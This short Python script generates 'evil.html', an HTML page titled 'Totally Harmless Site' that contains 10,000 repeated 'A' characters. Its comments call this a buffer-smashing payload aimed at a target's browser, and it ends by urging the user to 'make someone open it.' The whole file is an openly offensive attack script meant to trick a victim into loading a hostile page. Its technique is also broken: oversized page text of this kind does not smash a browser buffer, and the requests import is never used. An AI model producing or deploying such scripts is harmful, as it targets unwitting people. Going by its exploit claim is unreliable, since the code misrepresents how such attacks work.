import requests

# Craft a maliciously large payload
payload = "A" * 10000  # Smashing the buffer!

html = f"""
<!DOCTYPE html>
<html>
<head><title>Totally Harmless Site</title></head>
<body>
  <div>{payload}</div>
</body>
</html>
"""

# Host it somewhere and serve it to the target browser
with open("evil.html", "w") as f:
    f.write(html)

print("[+] Evil HTML file generated! Now make someone open it.")